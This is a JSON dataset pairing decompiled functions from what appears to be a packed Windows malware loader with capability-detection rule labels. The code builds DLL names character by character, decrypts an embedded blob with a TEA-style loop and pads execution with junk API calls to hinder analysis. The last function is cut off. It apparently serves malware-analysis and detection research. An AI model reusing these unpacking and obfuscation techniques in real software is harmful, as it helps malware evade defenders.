{
    "00403630": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid fcn.00403630(void)\n\n{\n    *0x4f66c8 = 0x6d;\n    *0x4f66ca = 0x73;\n    *0x4f66cc = 0x69;\n    *0x4f66ce = 0x6d;\n    *0x4f66d0 = 0x67;\n    *0x4f66d2 = 0x33;\n    *0x4f66d4 = 0x32;\n    *0x4f66d6 = 0x2e;\n    *0x4f66d8 = 100;\n    *0x4f66da = 0x6c;\n    *0x4f66de = 0;\n    *0x4f66dc = *0x4f66da;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x4f66c8);\n    return;\n}\n",
        "token_count": 213
    },
    "00404021": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid fcn.00404021(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint lpCalData;\n    uint lpString1;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint lpValue;\n    int32_t var_4h;\n    \n    if (*0x4f679c == 0x16) {\n        (*_sym.imp.KERNEL32.dll_FreeLibraryAndExitThread)(0, 0);\n    }\n    *0x4f679c = *0x4f679c + 0xb2d3b;\n    iVar1 = 0;\n    do {\n        if (iVar1 < 0x2990383) {\n            var_2ch = 0x17660cd;\n            var_1f0h = 0x3ba0f103;\n            var_148h = 0x52d50c04;\n            var_9ch = 0x5568df80;\n            var_e4h = 0x66e7aa9d;\n            var_164h = 0x3e660372;\n            var_1e8h = 0x43aa62f3;\n            var_c8h = 0x71023a2d;\n            var_13ch = 0x12a3f35c;\n            var_14ch = 0x660dbb95;\n            var_24h = 0x3d180cff;\n            var_c0h = 0x33b9ae68;\n            var_108h = 0x7b5f8cb5;\n            var_b8h = 0x30f08014;\n            var_50h = 0x3daac620;\n            var_170h = 0x13616ecc;\n            var_100h = 0x3bb6beb0;\n            var_174h = 0x5aa37451;\n            var_1c4h = 0x11d4046;\n            var_1e0h = 0x5008718e;\n            lpValue = 0x68561eb4;\n            var_238h = 0x1bd02286;\n            var_230h = 0x5035acbc;\n            var_f8h = 0x60ad8bb5;\n            var_f0h = 0x359c84e2;\n            var_e8h = 0x241db749;\n            var_1f4h = 0x2361aa33;\n            var_74h = 0x19beeff9;\n            var_140h = 0x561c1dfe;\n            var_94h = 0x3f9b3822;\n            var_1ch = 0x5b3f6a70;\n            var_e0h = 0x6060aa65;\n            var_168h = 0x3581c850;\n            var_b4h = 0x4bbce51e;\n            var_44h = 0x6d3002df;\n            var_234h = 0x705bd586;\n            var_1c0h = 0x64cbef0b;\n            var_104h = 0x552a1caf;\n            var_134h = 0x41a9b7b9;\n            var_8ch = 0x41af21eb;\n            var_b0h = 0x5b7889a1;\n            var_48h = 0x3a3fb1c3;\n            var_40h = 0x63e47cb2;\n            var_a8h = 0x3388cb30;\n            var_1d8h = 0x5ff29119;\n            var_1fch = 0x2f25774d;\n            var_38h = 0x730f68fb;\n            var_1b8h = 0x28500a22;\n            var_1cch = 0x249189f3;\n            var_228h = 0x2cff92eb;\n            var_3ch = 0x1fae4863;\n            var_ch = 0x56eeb8ab;\n            var_a0h = 0x5e3a5a3c;\n            var_21ch = 0x49547d76;\n            var_1bch = 0x530105b;\n            var_1d0h = 0x458182e5;\n            var_98h = 0x237da807;\n            var_30h = 0x5cbd99b6;\n            var_160h = 0x6625b6f5;\n            var_90h = 0x6390f7e;\n            var_88h = 0x425f6264;\n            var_138h = 0x26d1979a;\n            var_d8h = 0x7f89be6f;\n            var_14h = 0x5032a845;\n            var_240h = 0x3c963eab;\n            var_214h = 0x6e745d4c;\n            var_6ch = 0x40ba2d9a;\n            var_ach = 0x3b02ef95;\n            var_144h = 0x42f6ce2;\n            var_fch = 0x72d9b955;\n            var_124h = 0x7fbd1882;\n            var_dch = 0x2ec79087;\n            var_220h = 0x654d731;\n            var_130h = 0x747bf4a7;\n            var_204h = 0x511d571;\n            var_218h = 0x486ff9f1;\n            var_15ch = 0x6e2d47e2;\n            var_210h = 0x7b871ba9;\n            var_128h = 0x3068f3cd;\n            var_16ch = 0x32080af4;\n            var_28h = 0x5904023e;\n            var_64h = 0x2112113f;\n            var_20h = 0x11c98774;\n            var_11ch = 0x3fa0caf9;\n            var_194h = 0x2cfcb8d9;\n            var_1b4h = 0x227d7ca0;\n            var_80h = 0x1c29d52a;\n            var_d4h = 0x240013f4;\n            var_244h = 0x3c669dcb;\n            var_cch = 0x1debbab7;\n            var_120h = 0xd9f02f7;\n            var_118h = 0x4c2c8868;\n            var_1d4h = 0x390eae36;\n            var_84h = 0x1ace1109;\n            var_114h = 0xdd87f78;\n            var_1a4h = 0x10a8bbd2;\n            var_34h = 0x3d1f2d38;\n            var_1dch = 0x88b61c3;\n            var_17ch = 0x27c5ecbe;\n            var_5ch = 0x76ff7f1d;\n            var_78h = 0x42e37402;\n            var_f4h = 0x3102ba28;\n            var_1b0h = 0x6baecf20;\n            var_224h = 0x268c35;\n            var_ech = 0x30bd8067;\n            var_18h = 0x67790aca;\n            var_a4h = 0x4dfc13a7;\n            var_70h = 0x2f188a10;\n            var_18ch = 0x4119efb;\n            var_7ch = 0x59e81561;\n            var_68h = 0x3c5be40b;\n            var_19ch = 0x4012fdfa;\n            var_c4h = 0x3ea9f04;\n            var_10h = 0x5da429eb;\n            var_60h = 0x19774d96;\n            var_1a8h = 0x7ade5bb;\n            var_208h = 0x6bb1c5;\n            var_1a0h = 0x4360dd66;\n            var_198h = 0x2c8ad04a;\n            var_158h = 0xe756e15;\n            var_190h = 0x3957528e;\n            var_154h = 0x44154a5b;\n            var_200h = 0x3212ba0c;\n            var_110h = 0x71737d87;\n            var_188h = 0x7fb4a551;\n            var_1c8h = 0xe91d1dc;\n            var_58h = 0x3e9eee18;\n            var_1ech = 0x7f86703d;\n            var_1f8h = 0x69f21dbf;\n            var_54h = 0x37d009d7;\n            var_248h = 0x3e1acf1;\n            var_12ch = 0x3246e821;\n            var_180h = 0x77b1bd25;\n            var_d0h = 0x6c2d29d3;\n            var_bch = 0x19cdb9a2;\n            var_4h = 0x689dd0fb;\n            var_150h = 0x5469c0dc;\n            var_4ch = 0x1e4c398;\n            var_184h = 0xa4a14be;\n            var_23ch = 0x2a41f532;\n            var_1e4h = 0xeeb8952;\n            var_20ch = 0x609a7dfc;\n            var_178h = 0x22409ae5;\n            var_10ch = 0x1afe5495;\n            var_22ch = 0x7c586487;\n            var_1ach = 0x3665cc47;\n        }\n    } while ((iVar1 < 0x26da4b4d) && (iVar1 = iVar1 + 1,  iVar1 < 0x676ef62e));\n    *0x4f66dc = 0x6c;\n    *0x4f66e0 = 0;\n    *0x4f66c8 = 0x6b;\n    *0x4f66cc = 0x72;\n    *0x4f66d2 = 0x6c;\n    *0x4f66d6 = 0x32;\n    *0x4f66d8 = 0x2e;\n    *0x4f66ce = 0x6e;\n    *0x4f66d0 = 0x65;\n    *0x4f66da = 100;\n    *0x4f66d4 = 0x33;\n    *0x4f66ca = 0x65;\n    *0x4f66de = *0x4f66dc;\n    *0x4f66b8 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x4f66c8);\n    *0x4f6634 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0, *0x4f679c);\n    fcn.00403fd4();\n    uVar2 = 0;\n    *0x4f67a0 = *0x4ea34c;\n    if (*0x4f679c != 0) {\n        do {\n            var_4h = *0x4f67a0 + 0xb2d3b;\n            *(uVar2 + *0x4f6634) = *(var_4h + uVar2);\n            if (*0x4f679c == 0x44) {\n                (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(0, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CreateConsoleScreenBuffer)(0, 0, 0, 0, 0);\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *0x4f679c);\n    }\n    iVar1 = 0;\n    do {\n        if (*0x4f679c + iVar1 == 0x5e) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)(0, 0);\n            (*_sym.imp.KERNEL32.dll_OpenJobObjectA)(0, 0, 0x403488);\n            (*_sym.imp.KERNEL32.dll_lstrcpynA)(&lpString1, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetCalendarInfoW)(0, 0, 0, &lpCalData, 0, &lpValue);\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x40c893);\n    fcn.00403f00();\n    iVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n        if (iVar1 == 0x770e) {\n            fcn.00403fba();\n        }\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x286b97d);\n    fcn.00404015();\n    return;\n}\n",
        "token_count": 4099
    },
    "004036ab": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004036ab(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint lpszLongPath;\n    uint var_2e8h;\n    int32_t var_2e4h;\n    int32_t var_2e0h;\n    int32_t var_2dch;\n    int32_t var_2d8h;\n    int32_t var_2d4h;\n    uint32_t var_2d0h;\n    int32_t var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = arg_8h[1];\n    uVar4 = *arg_8h;\n    var_2e4h = *0x4e8348;\n    var_2dch = *0x4e834c;\n    var_2cch = 0;\n    var_2d0h = uVar4;\n    fcn.004036a4();\n    var_2cch = var_2cch + 0x23f;\n    var_2e0h = *0x4e8350;\n    var_2d8h = *0x4e8354;\n    var_2d4h = 0x20;\n    do {\n        var_8h = 5;\n        if (*0x4f679c == 0xfa9) {\n            *0x4f66c4 = 0xedeb2e40;\n        }\n        if (*0x4f679c == 0x3eb) {\n            *0x4f6630 = 0;\n        }\n        *0x4f66c0 = 0xf4ea3dee;\n        var_258h = 0x23409e45;\n        var_21ch = 0x546684a8;\n        var_200h = 0x3f378b90;\n        var_2a4h = 0x26b873dc;\n        var_164h = 0x358cf5cb;\n        var_2b8h = 0x29983644;\n        var_68h = 0x7dc6e5f5;\n        var_e4h = 0x3aa9ec81;\n        var_214h = 0x39fd3d19;\n        var_29ch = 0x348f6274;\n        var_110h = 0x6e41c7d3;\n        var_294h = 0x53e187b4;\n        var_dch = 0xfed61d6;\n        var_28ch = 0x7ada085d;\n        var_94h = 0x4a1e8d93;\n        var_15ch = 0x456866b3;\n        var_2bch = 0x510c15d;\n        var_8ch = 0xa2eee99;\n        var_d4h = 0x778c3974;\n        var_20ch = 0x5a464473;\n        var_204h = 0x685fa3d3;\n        var_1b4h = 0x6d8c862c;\n        var_108h = 0x6888eb1;\n        var_284h = 0x5090d793;\n        var_2c8h = 0x4abedd81;\n        var_260h = 0x76ec4423;\n        var_98h = 0x15e92005;\n        var_2ch = 0x70241620;\n        var_27ch = 0x131b9522;\n        var_cch = 0x2942bb1d;\n        var_e8h = 0x2523a75b;\n        var_11ch = 0x11d08d33;\n        var_114h = 0x4b222137;\n        var_1c0h = 0x321ecfe3;\n        var_274h = 0x575b796;\n        var_1e8h = 0x1fffdd6a;\n        var_84h = 0x75faf039;\n        var_24h = 0x15899521;\n        var_1a8h = 0x1109d039;\n        var_e0h = 0x75fcdb38;\n        var_60h = 0x713f7202;\n        var_268h = 0x2a34467c;\n        var_90h = 0x7ab9969b;\n        var_154h = 0x6e6f4f62;\n        var_150h = 0x68a0941f;\n        var_7ch = 0x771b8962;\n        var_1ach = 0x708fef37;\n        var_1ch = 0xae5cf82;\n        var_d8h = 0x5afd073b;\n        var_b8h = 0x7da8d542;\n        var_2c4h = 0x63059b8b;\n        var_30h = 0x4e282ba7;\n        var_2b0h = 0x5c4d4cf4;\n        var_28h = 0x1a6faced;\n        var_248h = 0x2a7bc4d0;\n        var_1d0h = 0x571fe9f2;\n        var_188h = 0x7fb79e3b;\n        var_1f8h = 0x12911132;\n        var_26ch = 0x5e46be7b;\n        var_c4h = 0x3ab28b4;\n        var_14h = 0x79ed9082;\n        var_1e0h = 0x51c3c43d;\n        var_180h = 0x4ed5ae5f;\n        var_74h = 0x77ee5c69;\n        var_10h = 0x699e0318;\n        var_178h = 0x6a3df6d9;\n        var_1a4h = 0x6a68727f;\n        var_130h = 0x71a88410;\n        var_2a0h = 0x72144519;\n        var_230h = 0x7943706e;\n        var_88h = 0x166ccf3d;\n        var_170h = 0x5d7bef27;\n        var_148h = 0x3fb67f18;\n        var_264h = 0x687df6e2;\n        var_19ch = 0xb23fdac;\n        var_100h = 0x3c0ec683;\n        var_b0h = 0x52c79ee7;\n        var_2ach = 0xea67b34;\n        var_d0h = 0x59ee28df;\n        var_168h = 0x2817525b;\n        var_1fch = 0x41ec49cf;\n        var_6ch = 0x152f532e;\n        var_58h = 0x6bcf2b09;\n        var_25ch = 0xd0455f;\n        var_1a0h = 0x113cca32;\n        var_50h = 0x2ca09670;\n        var_218h = 0x1083bd57;\n        var_bch = 0x8e56de1;\n        var_298h = 0x357268d5;\n        var_2b4h = 0x3f5a247a;\n        var_20h = 0x7a66e545;\n        var_228h = 0x24e4c52e;\n        var_160h = 0x18be6c3e;\n        var_14ch = 0x3db8192e;\n        var_270h = 0x777708fe;\n        var_1b8h = 0x746719ea;\n        var_128h = 0x70e28784;\n        var_194h = 0x74b1451c;\n        var_b4h = 0x1fc38e1c;\n        var_208h = 0x1a454084;\n        var_f8h = 0x6cfab315;\n        var_144h = 0x5bcca26f;\n        var_254h = 0xadc7db7;\n        var_2c0h = 0x33be3dc9;\n        var_24ch = 0x218471aa;\n        var_18ch = 0x65649589;\n        var_140h = 0x51dad296;\n        var_288h = 0x3c96d833;\n        var_a8h = 0x65f5d1c;\n        var_238h = 0x45644988;\n        var_184h = 0x69748472;\n        var_10ch = 0x297ecfd3;\n        var_280h = 0x4f7dbcd7;\n        var_48h = 0x18561cab;\n        var_ach = 0x720ef4aa;\n        var_138h = 0x10ed17e7;\n        var_2a8h = 0x3953200b;\n        var_64h = 0x5142c32a;\n        var_1c8h = 0x563d11f2;\n        var_1f4h = 0x160fd461;\n        var_244h = 0x603ca06c;\n        var_104h = 0x13629ac1;\n        var_13ch = 0x74093f37;\n        var_198h = 0x679680a8;\n        var_1ech = 0x207d8eeb;\n        var_18h = 0xa216c63;\n        var_fch = 0x2f5adecc;\n        var_17ch = 0x44a2df35;\n        var_23ch = 0x4a3c9e05;\n        var_234h = 0x2ac010e7;\n        var_5ch = 0x67852e;\n        var_158h = 0x483f468d;\n        var_40h = 0xea69142;\n        var_1e4h = 0x1b85e6;\n        var_54h = 0x2e8bf091;\n        var_80h = 0x7accba6a;\n        var_c8h = 0x70b903ac;\n        var_240h = 0x8dfbb34;\n        var_a0h = 0x41683a2c;\n        var_1f0h = 0x1c83fdd3;\n        var_f0h = 0x4ad81701;\n        var_134h = 0x5d5c7f97;\n        var_4ch = 0x679ac91e;\n        var_44h = 0x1899f8c7;\n        var_a4h = 0x4b6ad8c;\n        var_120h = 0x103e9126;\n        var_38h = 0x72b610fa;\n        var_1dch = 0x348041df;\n        var_9ch = 0x7cee9c15;\n        var_220h = 0x18528e3a;\n        var_1d4h = 0x2d0d3107;\n        var_f4h = 0x7b65c550;\n        var_22ch = 0x75ec9eda;\n        var_190h = 0x42646a58;\n        var_250h = 0x3ddf5eff;\n        var_12ch = 0x36dc2ee9;\n        var_3ch = 0x21b2f01a;\n        var_210h = 0x726bed3c;\n        var_290h = 0x6718329c;\n        var_278h = 0x8d77509;\n        var_78h = 0x56f4f074;\n        var_1d8h = 0x6b3a3a26;\n        var_1cch = 0x6bee7b34;\n        var_1c4h = 0x2a76cefe;\n        var_34h = 0x25736362;\n        var_1bch = 0x5e24fb8f;\n        var_118h = 0x13cc9676;\n        var_124h = 0x145ce368;\n        var_c0h = 0x53a4e4aa;\n        var_174h = 0x180454cc;\n        var_1b0h = 0x5abc23bd;\n        var_70h = 0x7a98d7b;\n        var_224h = 0x48a0c18f;\n        var_ech = 0x6e4572f2;\n        var_16ch = 0x924e26a9;\n        var_4h = var_2cch + uVar4 ^ (var_2d0h >> 5) + var_2d8h ^ uVar4 * 0x10 + var_2e0h;\n        if (*0x4f679c == 0x1a3) {\n            (*_sym.imp.KERNEL32.dll_MoveFileA)(0, 0);\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(&var_2e8h);\n            (*_sym.imp.KERNEL32.dll_GetLongPathNameA)(0x403360, &lpszLongPath, 0);\n        }\n        uVar2 = uVar2 - var_4h;\n        var_ch = 4;\n        uVar3 = uVar2 * 0x10 + var_2e4h;\n        var_4h = (uVar2 >> (var_8h & 0x1f)) + var_2dch;\n        uVar1 = var_2cch + uVar2;\n        if (*0x4f679c == 0x121) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesA)(&lpszLongPath, 0, 0);\n            (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0x40337c);\n        }\n        *0x4f0088 = 0;\n        var_2cch = var_2cch + 0x61c88647;\n        uVar4 = uVar4 - (var_4h ^ uVar3 ^ uVar1);\n        var_2d4h = var_2d4h + -1;\n        var_2d0h = uVar4;\n    } while (var_2d4h != 0);\n    *arg_8h = uVar4;\n    arg_8h[1] = uVar2;\n    return;\n}\n",
        "token_count": 4713
    },
    "00403f00": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00403f00(void)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h;\n    uint lpszLongPath;\n    uint lpNumberOfCharsWritten;\n    uint var_4h;\n    \n    arg_8h = *0x4f6634;\n    for (uVar1 = *0x4f679c >> 3; uVar1 != 0; uVar1 = uVar1 - 1) {\n        if (*0x4f679c == 0x5d) {\n            (*_sym.imp.KERNEL32.dll_WriteProfileSectionA)(0x4033a8, 0x40338c);\n            (*_sym.imp.KERNEL32.dll_GetLongPathNameA)(0x4033ec, &lpszLongPath, 0);\n            (*_sym.imp.KERNEL32.dll_WriteConsoleW)(0, 0, 0, &lpNumberOfCharsWritten, 0);\n            (*_sym.imp.KERNEL32.dll_MoveFileA)(0x40340c, 0x403400);\n            (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x40343c);\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsW)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WriteConsoleA)(0, 0, 0, &var_4h, 0);\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)(0, 0);\n        }\n        fcn.004036ab(arg_8h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "004047c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004047c8(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != '\\0') {\n        fcn.00404818(*(param_1 + 4));\n    }\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    return;\n}\n",
        "token_count": 81
    },
    "00404818": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404818(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4ef34c, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00405178();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00405136(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00407ef3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407ef3(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4e7430) {\n        return;\n    }\n    *0x4efd90 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4efd94 = &arg_8h;\n    *0x4efcd0 = 0x10001;\n    *0x4efc78 = 0xc0000409;\n    *0x4efc7c = 1;\n    var_328h = *0x4e7430;\n    var_324h = *0x4e7434;\n    *0x4efc84 = unaff_retaddr;\n    *0x4efd5c = in_GS;\n    *0x4efd60 = in_FS;\n    *0x4efd64 = in_ES;\n    *0x4efd68 = in_DS;\n    *0x4efd6c = unaff_EDI;\n    *0x4efd70 = unaff_ESI;\n    *0x4efd74 = unaff_EBX;\n    *0x4efd78 = in_EDX;\n    *0x4efd7c = in_ECX;\n    *0x4efd80 = in_EAX;\n   